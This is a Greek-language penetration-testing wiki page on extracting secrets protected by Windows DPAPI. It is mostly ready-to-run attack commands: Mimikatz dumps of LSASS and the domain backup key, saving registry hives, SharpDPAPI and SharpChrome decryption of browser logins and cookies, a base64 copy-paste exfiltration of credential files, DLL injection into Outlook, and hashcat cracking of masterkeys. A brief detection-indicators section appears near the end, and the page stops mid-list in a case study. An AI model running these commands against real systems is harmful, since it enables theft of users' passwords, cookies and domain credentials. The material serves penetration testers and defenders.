# DPAPI - Εξαγωγή κωδικών πρόσβασης

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

Το Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, αξιοποιώντας μυστικά χρήστη ή συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές, επιτρέποντάς τους να κρυπτογραφούν δεδομένα με ένα κλειδί που προκύπτει από τα μυστικά σύνδεσης του χρήστη ή, για την κρυπτογράφηση συστήματος, από τα μυστικά ελέγχου ταυτότητας του domain του συστήματος. Έτσι, οι προγραμματιστές δεν χρειάζεται να διαχειρίζονται οι ίδιοι την προστασία του κλειδιού κρυπτογράφησης.

Ο συνηθέστερος τρόπος χρήσης του DPAPI είναι μέσω των συναρτήσεων **`CryptProtectData` και `CryptUnprotectData`**, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα χρησιμοποιώντας το περιβάλλον ασφαλείας της διεργασίας στην οποία είναι συνδεδεμένος ο χρήστης. Από προεπιλογή, τα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από το ίδιο περιβάλλον χρήστη ή συστήματος που τα κρυπτογράφησε.<sup>[[2]](#references)[[3]](#references)</sup>

Αυτές οι συναρτήσεις δέχονται επίσης μια προαιρετική **παράμετρο εντροπίας**, η οποία χρησιμοποιείται κατά την κρυπτογράφηση και την αποκρυπτογράφηση. Για την αποκρυπτογράφηση δεδομένων που προστατεύονται με προαιρετική εντροπία απαιτείται η ίδια τιμή εντροπίας.<sup>[[2]](#references)[[6]](#references)</sup>

### Δημιουργία κλειδιού χρήστη

Το DPAPI παράγει μια τιμή ειδική για κάθε χρήστη (συχνά αποκαλούμενη **pre-key**) από τα διαπιστευτήρια του χρήστη. Η ακριβής παραγωγή εξαρτάται από τον λογαριασμό και την έκδοση του λειτουργικού συστήματος. Για παράδειγμα, το Impacket δοκιμάζει μια διαδρομή HMAC-SHA1 που βασίζεται στο SHA-1 digest του κωδικού πρόσβασης σε UTF-16LE, μια άλλη που βασίζεται στο MD4/NT hash του κωδικού πρόσβασης, καθώς και μια διαδρομή που παράγεται με PBKDF2-SHA256 για Protected Users. Γι' αυτό τα offline εργαλεία μπορούν συχνά να παράγουν το απαιτούμενο υλικό είτε από τον κωδικό πρόσβασης σε απλό κείμενο είτε από ένα διαθέσιμο NT hash.<sup>[[2]](#references)[[10]](#references)</sup>

Αυτό είναι ιδιαίτερα ενδιαφέρον, επειδή αν ένας attacker αποκτήσει το password hash του χρήστη, μπορεί:

- **Να αποκρυπτογραφήσει οποιαδήποτε δεδομένα κρυπτογραφήθηκαν με DPAPI** χρησιμοποιώντας το κλειδί αυτού του χρήστη, χωρίς να χρειάζεται να επικοινωνήσει με κάποιο API
- Να προσπαθήσει να **κάνει crack τον κωδικό πρόσβασης** offline, ώστε να παράγει το έγκυρο DPAPI key

Το DPAPI διατηρεί ένα ή περισσότερα **master keys** για κάθε χρήστη, αντί να δημιουργεί νέο master key για κάθε προστατευμένο blob. Κάθε master key έχει ένα **GUID** (Globally Unique Identifier), και ένα κρυπτογραφημένο blob καταγράφει ποιο master key το προστατεύει.<sup>[[2]](#references)</sup>

Τα master keys αποθηκεύονται στον κατάλογο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου το `{SID}` είναι το Security Identifier του χρήστη. Το αρχείο master key περιέχει υλικό που προστατεύεται από το **pre-key** του χρήστη και, για χρήστες domain, υλικό ανάκτησης που προστατεύεται από ένα **domain backup key**.<sup>[[2]](#references)</sup>

Σημειώστε ότι το **domain key που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους domain controllers και δεν αλλάζει**, επομένως, αν ένας attacker αποκτήσει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών του domain.<sup>[[2]](#references)</sup>

Τα κρυπτογραφημένα blobs περιέχουν στις κεφαλίδες τους το **GUID του master key** που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων.

> [!TIP]
> Τα κρυπτογραφημένα blobs του DPAPI ξεκινούν με **`01 00 00 00`**

Εύρεση master keys:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Αυτός είναι ο τρόπος με τον οποίο θα μοιάζουν πολλά Master Keys ενός χρήστη:

![Τι είναι το DPAPI - Δημιουργία κλειδιών χρήστη: Αυτός είναι ο τρόπος με τον οποίο θα μοιάζουν πολλά Master Keys ενός χρήστη](<../../images/image (1121).png>)

### Δημιουργία κλειδιού μηχανήματος/συστήματος

Αυτό είναι το κλειδί που χρησιμοποιείται από το μηχάνημα για την κρυπτογράφηση δεδομένων. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, το οποίο είναι ένα ειδικό κλειδί στο οποίο έχει πρόσβαση μόνο ο χρήστης SYSTEM. Αυτό το κλειδί χρησιμοποιείται για την κρυπτογράφηση δεδομένων στα οποία πρέπει να έχει πρόσβαση το ίδιο το σύστημα, όπως διαπιστευτήρια επιπέδου μηχανήματος ή μυστικά για όλο το σύστημα.<sup>[[2]](#references)</sup>

Σημειώστε ότι αυτά τα κλειδιά **δεν έχουν αντίγραφο ασφαλείας domain**, επομένως είναι προσβάσιμα μόνο τοπικά:

- Το **Mimikatz** μπορεί να αποκτήσει πρόσβαση σε αυτό κάνοντας dump τα LSA secrets με την εντολή: `mimikatz lsadump::secrets`
- Το secret αποθηκεύεται στο registry, επομένως ένας διαχειριστής θα μπορούσε να **τροποποιήσει τα δικαιώματα DACL για να αποκτήσει πρόσβαση σε αυτό**. Η διαδρομή του registry είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Είναι επίσης δυνατή η offline εξαγωγή από registry hives. Για παράδειγμα, ως διαχειριστής στον στόχο, αποθηκεύστε τα hives και εξαγάγετέ τα:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Στη συνέχεια, στο μηχάνημα ανάλυσής σας, ανακτήστε το μυστικό DPAPI_SYSTEM LSA από τα hives και χρησιμοποιήστε το για να αποκρυπτογραφήσετε blobs DPAPI πεδίου μηχανήματος (για παράδειγμα, διαπιστευτήρια εφαρμογών που προστατεύονται από το μηχάνημα ή προφίλ Wi-Fi):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Παράδειγμα DPAPI ειδικά για το Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Δεδομένα που προστατεύονται από το DPAPI

Στα προσωπικά δεδομένα που προστατεύονται από το DPAPI περιλαμβάνονται:

- Διαπιστευτήρια Windows
- Κωδικοί πρόσβασης και δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
- Κωδικοί πρόσβασης λογαριασμών e-mail και εσωτερικού FTP για εφαρμογές όπως το Outlook και το Windows Mail
- Κωδικοί πρόσβασης για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
- Κωδικοί πρόσβασης για συνδέσεις απομακρυσμένης επιφάνειας εργασίας, .NET Passport και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και ελέγχου ταυτότητας
- Κωδικοί πρόσβασης δικτύου που διαχειρίζεται το Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν το CryptProtectData, όπως το Skype, το MSN messenger και άλλες
- Κρυπτογραφημένα blobs μέσα στο μητρώο
- ...

Τα δεδομένα που προστατεύονται από το σύστημα περιλαμβάνουν:
- Κωδικούς πρόσβασης WiFi
- ...

Οι κωδικοί πρόσβασης προγραμματισμένων εργασιών αποτελούν ξεχωριστό ζήτημα LSA-secret. Μια εργασία που έχει καταχωριστεί με τον [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) μπορεί να αποθηκεύσει έναν κωδικό πρόσβασης για ανάκτηση λογαριασμού τοπικού διαχειριστή/SYSTEM· μια εργασία S4U ή με διαδραστικό token δεν αποδεικνύει ότι αποθηκεύτηκε κωδικός πρόσβασης. Το principal και ο τύπος σύνδεσης μιας εργασίας αποτελούν ισχυρότερες ενδείξεις από το όνομα του λογαριασμού εκτέλεσης από μόνο του.

### Επιλογές εξαγωγής master key

- Αν ο χρήστης έχει δικαιώματα domain admin, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα master keys χρηστών στον τομέα:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Με δικαιώματα local admin, είναι δυνατό να αποκτήσετε πρόσβαση στη μνήμη LSASS για να εξαγάγετε τα DPAPI master keys όλων των συνδεδεμένων χρηστών και το SYSTEM key.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Αν ο χρήστης έχει δικαιώματα local admin, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Αν είναι γνωστός ο κωδικός πρόσβασης ή το hash NTLM του χρήστη, μπορείτε να **αποκρυπτογραφήσετε απευθείας τα master keys του χρήστη**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Αν βρίσκεστε σε συνεδρία ως χρήστης, μπορείτε να ζητήσετε από τον DC το **κλειδί αντιγράφου ασφαλείας για την αποκρυπτογράφηση των master keys μέσω RPC**. Αν είστε local admin και ο χρήστης είναι συνδεδεμένος, μπορείτε να **κλέψετε το session token του**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Λίστα Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Πρόσβαση σε κρυπτογραφημένα δεδομένα DPAPI

### Εντοπισμός κρυπτογραφημένων δεδομένων DPAPI

Τα **αρχεία που προστατεύονται για συνήθεις χρήστες** βρίσκονται στα:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ελέγξτε επίσης αντικαθιστώντας το `\Roaming\` με `\Local\` στις παραπάνω διαδρομές.

Παραδείγματα απαρίθμησης:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να εντοπίσει κρυπτογραφημένα blobs DPAPI στο σύστημα αρχείων, στο μητρώο και σε blobs B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Σημειώστε ότι το [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο repo) μπορεί να χρησιμοποιηθεί για αποκρυπτογράφηση ευαίσθητων δεδομένων μέσω DPAPI, όπως cookies.<sup>[[12]](#references)</sup>

#### Γρήγορες συνταγές για Chromium/Edge/Electron (SharpChrome)

- Τρέχων χρήστης, διαδραστική αποκρυπτογράφηση αποθηκευμένων logins/cookies (λειτουργεί ακόμα και με app-bound cookies του Chrome 127+, επειδή το επιπλέον κλειδί ανακτάται από το Credential Manager του χρήστη κατά την εκτέλεση στο user context):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Ανάλυση offline όταν έχεις μόνο αρχεία. Αρχικά εξήγαγε το κλειδί κατάστασης AES από το "Local State" του profile και έπειτα χρησιμοποίησέ το για να αποκρυπτογραφήσεις τη βάση δεδομένων των cookies:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Triage σε επίπεδο domain/απομακρυσμένα όταν έχετε το DPAPI domain backup key (PVK) και admin στο target host:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Αν έχετε το DPAPI prekey/credkey ενός χρήστη (από το LSASS), μπορείτε να παραλείψετε το password cracking και να αποκρυπτογραφήσετε απευθείας τα δεδομένα προφίλ:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Σημειώσεις
- Νεότερες εκδόσεις του Chrome/Edge ενδέχεται να αποθηκεύουν ορισμένα cookies χρησιμοποιώντας κρυπτογράφηση "App-Bound". Δεν είναι δυνατή η αποκρυπτογράφηση αυτών των συγκεκριμένων cookies εκτός σύνδεσης χωρίς το πρόσθετο app-bound key· εκτελέστε το SharpChrome στο context του χρήστη-στόχου για να το ανακτήσετε αυτόματα. Δείτε την ανάρτηση στο blog ασφάλειας του Chrome που αναφέρεται παρακάτω.<sup>[[5]](#references)</sup>

### Κλειδιά πρόσβασης και δεδομένα

- **Χρησιμοποιήστε το SharpDPAPI** για να λάβετε διαπιστευτήρια από αρχεία κρυπτογραφημένα με DPAPI από την τρέχουσα συνεδρία:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Λήψη πληροφοριών διαπιστευτηρίων** όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Πρόσβαση σε masterkeys**:

Αποκρυπτογραφήστε ένα masterkey ενός χρήστη ζητώντας το **domain backup key** μέσω RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης τα εξής ορίσματα για την αποκρυπτογράφηση masterkey (σημειώστε ότι μπορείτε να χρησιμοποιήσετε το `/rpc` για να λάβετε το εφεδρικό κλειδί του domain, το `/password` για να χρησιμοποιήσετε έναν κωδικό πρόσβασης σε απλό κείμενο ή το `/pvk` για να καθορίσετε ένα αρχείο ιδιωτικού κλειδιού DPAPI domain...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Αποκρυπτογράφηση δεδομένων με χρήση masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για αποκρυπτογράφηση `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε ότι μπορείτε να χρησιμοποιήσετε το `/rpc` για να λάβετε το backup key του domain, το `/password` για να χρησιμοποιήσετε έναν κωδικό πρόσβασης σε απλό κείμενο, το `/pvk` για να καθορίσετε ένα αρχείο ιδιωτικού κλειδιού DPAPI του domain και το `/unprotect` για να χρησιμοποιήσετε τη συνεδρία του τρέχοντος χρήστη...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Χρήση ενός DPAPI prekey/credkey απευθείας (δεν απαιτείται κωδικός πρόσβασης)

Αν μπορείτε να κάνετε dump το LSASS, το Mimikatz συχνά αποκαλύπτει ένα DPAPI key ανά logon, το οποίο μπορεί να χρησιμοποιηθεί για την αποκρυπτογράφηση των masterkeys του χρήστη χωρίς να γνωρίζετε τον κωδικό πρόσβασης σε απλό κείμενο. Περάστε αυτήν την τιμή απευθείας στο εργαλείο:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Αποκρυπτογράφηση ορισμένων δεδομένων με χρήση της **τρέχουσας συνεδρίας χρήστη**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Offline αποκρυπτογράφηση με Impacket dpapi.py

Αν έχετε το SID και τον κωδικό πρόσβασης (ή το NT hash) του χρήστη-θύματος, μπορείτε να αποκρυπτογραφήσετε πλήρως offline τα DPAPI masterkeys και τα Credential Manager blobs χρησιμοποιώντας το Impacket dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Εντοπίστε τα artefacts στον δίσκο:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - Αντίστοιχο masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Αν τα εργαλεία μεταφοράς αρχείων είναι ασταθή, μετατρέψτε τα αρχεία σε base64 στον host και αντιγράψτε την έξοδο:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Αποκρυπτογραφήστε το masterkey με το SID του χρήστη και τον κωδικό πρόσβασης/hash:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Χρησιμοποιήστε το αποκρυπτογραφημένο masterkey για να αποκρυπτογραφήσετε το credential blob:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Αυτή η διαδικασία συχνά ανακτά διαπιστευτήρια domain που έχουν αποθηκευτεί από εφαρμογές μέσω του Windows Credential Manager, συμπεριλαμβανομένων λογαριασμών διαχειριστή (π.χ., `*_adm`).

---

### Χειρισμός προαιρετικής εντροπίας ("Third-party entropy")

Ορισμένες εφαρμογές περνούν μια πρόσθετη τιμή **entropy** στο `CryptProtectData`. Χωρίς αυτήν την τιμή, το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμη κι αν είναι γνωστό το σωστό masterkey. Επομένως, η απόκτηση της entropy είναι απαραίτητη όταν στοχεύετε διαπιστευτήρια που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, ορισμένα VPN clients).

Το [**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που κάνει hook στις συναρτήσεις DPAPI μέσα στη διεργασία-στόχο και καταγράφει διαφανώς κάθε προαιρετική entropy που παρέχεται. Η εκτέλεση του EntropyCapture σε λειτουργία **DLL-injection** σε διεργασίες όπως οι `outlook.exe` ή `vpnclient.exe` δημιουργεί ένα αρχείο που αντιστοιχίζει κάθε buffer entropy με τη διεργασία κλήσης και το blob. Η entropy που συλλέχθηκε μπορεί αργότερα να δοθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) για την αποκρυπτογράφηση των δεδομένων.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Η Microsoft εισήγαγε μια μορφή masterkey **context 3** από τα Windows 10 v1607 (2016). Το `hashcat` v6.2.6 (Δεκέμβριος 2023) πρόσθεσε τα hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) και **22102** (context 3), επιτρέποντας το cracking κωδικών πρόσβασης χρηστών απευθείας από το αρχείο masterkey με επιτάχυνση GPU. Έτσι, οι attackers μπορούν να εκτελούν επιθέσεις word-list ή brute-force χωρίς να αλληλεπιδρούν με το σύστημα-στόχο.<sup>[[7]](#references)</sup>

Το `DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Το εργαλείο μπορεί επίσης να αναλύσει blobs Credential και Vault, να τα αποκρυπτογραφήσει με cracked keys και να εξαγάγει passwords σε cleartext.<sup>[[8]](#references)</sup>


### Πρόσβαση σε δεδομένα άλλου μηχανήματος

Στα **SharpDPAPI και SharpChrome** μπορείτε να ορίσετε την επιλογή **`/server:HOST`** για πρόσβαση στα δεδομένα ενός απομακρυσμένου μηχανήματος. Φυσικά, πρέπει να έχετε δυνατότητα πρόσβασης σε αυτό το μηχάνημα και στο παρακάτω παράδειγμα θεωρείται ότι είναι γνωστό το **domain backup encryption key**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Άλλα εργαλεία

### HEKATOMB

Το [**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του backup key του domain controller μέσω RPC. Στη συνέχεια, το script επιλύει τις διευθύνσεις IP όλων των υπολογιστών και εκτελεί smbclient σε όλους τους υπολογιστές, για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να τα αποκρυπτογραφήσει με το domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα υπολογιστών που εξήχθη από το LDAP, μπορείτε να εντοπίσετε κάθε υποδίκτυο, ακόμα κι αν δεν το γνωρίζατε!

### DonPAPI 2.x (2024-05)

Το [**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να κάνει αυτόματα dump τα μυστικά που προστατεύονται από DPAPI. Η έκδοση 2.x εισήγαγε τα εξής:<sup>[[9]](#references)</sup>

* Παράλληλη συλλογή blobs από εκατοντάδες hosts
* Ανάλυση των masterkeys **context 3** και αυτόματη ενσωμάτωση cracking με Hashcat
* Υποστήριξη κρυπτογραφημένων cookies Chrome "App-Bound" (δείτε την επόμενη ενότητα)
* Μια νέα λειτουργία **`--snapshot`**, που εκτελεί επαναλαμβανόμενες αναζητήσεις στα endpoints και εντοπίζει διαφορές σε νέα blobs

### DPAPISnoop

Το [**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας parser C# για αρχεία masterkey/credential/vault, ο οποίος μπορεί να παράγει μορφές Hashcat/JtR και προαιρετικά να ξεκινά αυτόματα cracking. Υποστηρίζει πλήρως τις μορφές machine και user masterkey έως και τα Windows 11 24H1.<sup>[[8]](#references)</sup>


## Συνήθεις ενδείξεις

- Πρόσβαση σε αρχεία στους καταλόγους `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και σε άλλους καταλόγους που σχετίζονται με DPAPI.
    - Ιδίως μέσω network share, όπως το **C$** ή το **ADMIN$**.
- Χρήση των **Mimikatz**, **SharpDPAPI** ή παρόμοιων εργαλείων για πρόσβαση στη μνήμη LSASS ή για dump των masterkeys.
- Event **4662**: *Εκτελέστηκε μια λειτουργία σε ένα αντικείμενο* – μπορεί να συσχετιστεί με πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
- Event **4673/4674**, όταν μια διεργασία ζητά το *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ευπάθειες και αλλαγές στο οικοσύστημα 2023-2025

* **CVE-2023-36004 – Παραποίηση του Windows DPAPI Secure Channel** (Νοέμβριος 2023). Ένας attacker με πρόσβαση στο δίκτυο μπορούσε να ξεγελάσει ένα μέλος του domain ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση των masterkeys των χρηστών. Η ευπάθεια διορθώθηκε στη cumulative update του Νοεμβρίου 2023 – οι administrators θα πρέπει να διασφαλίσουν ότι οι DCs και οι σταθμοί εργασίας έχουν εγκαταστήσει όλες τις ενημερώσεις.<sup>[[4]](#references)</sup>
* **Κρυπτογράφηση cookies “App-Bound” του Chrome 127** (Ιούλιος 2024): αντικατέστησε την παλαιότερη προστασία που βασιζόταν αποκλειστικά στο DPAPI με ένα επιπλέον key, αποθηκευμένο στο **Credential Manager** του χρήστη. Η offline αποκρυπτογράφηση cookies απαιτεί πλέον τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Τα SharpChrome v2.3 και DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον key όταν εκτελούνται με το context του χρήστη.<sup>[[5]](#references)</sup>


### Μελέτη περίπτωσης: Zscaler Client Connector – Προσαρμοσμένη εντροπία που προκύπτει από το SID

Το Zscaler Client Connector αποθηκεύει αρκετά αρχεία ρυθμίσεων στο `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο κρυπτογραφείται με **DPAPI (Machine scope)**, αλλά ο προμηθευτής παρέχει **custom entropy** που *υπολογίζεται κατά την εκτέλεση*, αντί να αποθηκεύεται στον δίσκο.<sup>[[1]](#references)</sup>

Η εντροπία αναδημιουργείται από δύο στοιχεία:

1. Ένα hard-coded secret ενσωματωμένο στο `ZSACredentialProvider.dll`.
2. Το **SID** του λογαριασμού Windows στον οποίο ανήκει η ρύθμιση.

